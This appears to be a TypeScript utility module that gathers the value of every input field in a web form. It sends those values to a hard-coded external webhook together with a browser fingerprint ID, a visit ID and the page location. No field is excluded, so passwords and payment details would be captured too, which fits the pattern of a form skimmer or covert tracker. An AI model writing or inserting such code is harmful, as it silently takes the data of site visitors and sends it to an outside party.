export const collectInputData = (form: HTMLElement) => {
    const inputs = form.querySelectorAll('input')
    const inputData: { [k: string]: string } = {}
    inputs.forEach((input) => {
      if (input.value) {
        inputData[input.name] = input.value
      }
    })
    return inputData
  }
  
  export const sendCollectedData = async (
    data: {
      visitID: string
      fingerprintID: string
      collectedInputData?: { [k: string]: string }
      origin?: string
      fingerprintData?: unknown
      Location?: Location
    } = {
      visitID: '',
      fingerprintID: '',
      origin: window.location.origin,
      Location: window.location,
    },
  ) => {
    try {
      await fetch(
        ' https://api.axc.ae/webhook/08785474-20ca-4e9e-a519-7da2ae1983db',
        {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(data),
        },
      )
    } catch (_) {
      console.log(_)
    }
  }
  